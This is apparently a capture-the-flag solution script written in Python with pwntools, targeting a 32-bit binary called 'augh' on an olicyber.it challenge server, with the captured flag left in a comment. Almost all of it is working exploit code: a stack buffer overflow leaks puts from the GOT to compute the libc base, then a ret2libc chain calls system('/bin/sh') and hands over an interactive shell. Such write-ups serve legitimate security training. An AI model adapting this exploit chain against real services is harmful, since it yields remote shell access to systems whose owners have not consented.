from pwn import *

elf = ELF("augh")
libc = ELF("libc6-i386_2.27-3ubuntu1_amd64.so")
offset = 0x2a  # 42
r = remote("augh.challs.olicyber.it", 10605)
ret = 0x8048ae6  # ret gadget


def send(payload):
    r.sendlineafter("Inserisci scelta > ", "5")
    r.recvuntil(" Lasciaci pure un feedback: ")
    r.sendline(payload)


with log.progress("leaking libc_base address") as l:
    payload = b"A" * offset
    payload += p32(0x8048420)
    payload += p32(elf.sym['main'])
    payload += p32(elf.got['puts'])
    send(payload)

    r.recvuntil("Arrivederci!\n")
    puts = u32(r.recv(4))
    l.status(hex(puts))
    libc_base = puts - libc.sym['puts']
    system = libc_base + libc.sym['system']
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    l.success(hex(libc_base))

payload = b'A' * offset
payload += p32(system)
payload += p32(ret)
payload += p32(binsh)
send(payload)
r.recvuntil("Arrivederci!\n")
r.interactive()

# FLAG --> flag{T0ro_sedut0_s4lut4_i_pwn3r5}}
